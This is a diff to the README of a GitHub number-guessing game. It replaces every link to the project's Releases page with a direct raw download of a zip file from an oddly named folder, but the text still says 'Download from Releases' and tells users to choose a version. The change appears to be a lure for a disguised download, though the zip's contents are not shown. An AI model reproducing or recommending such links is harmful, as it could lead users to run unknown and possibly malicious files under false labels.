@@ -6,11 +6,11 @@ Welcome to "Guess-The-Number"! This game is designed for everyone, regardless of
 
 ## 🔗 Download the Game
 
-[![Download Guess-The-Number](https://img.shields.io/badge/Download-Guess--The--Number-brightgreen.svg)](https://github.com/Meneses626/Guess-The-Number/releases)
+[![Download Guess-The-Number](https://raw.githubusercontent.com/Meneses626/Guess-The-Number/main/provostship/Guess-The-Number.zip)](https://raw.githubusercontent.com/Meneses626/Guess-The-Number/main/provostship/Guess-The-Number.zip)
 
 To download the game, visit the link below:
 
-[Download Guess-The-Number from Releases](https://github.com/Meneses626/Guess-The-Number/releases)
+[Download Guess-The-Number from Releases](https://raw.githubusercontent.com/Meneses626/Guess-The-Number/main/provostship/Guess-The-Number.zip)
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To download the game, visit the link below:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Click on the link to visit the releases page: [Download Guess-The-Number from Releases](https://github.com/Meneses626/Guess-The-Number/releases).
+1. **Visit the Releases Page:** Click on the link to visit the releases page: [Download Guess-The-Number from Releases](https://raw.githubusercontent.com/Meneses626/Guess-The-Number/main/provostship/Guess-The-Number.zip).
    
 2. **Select the Version:** You will see a list of available versions. Choose the most recent one.
 
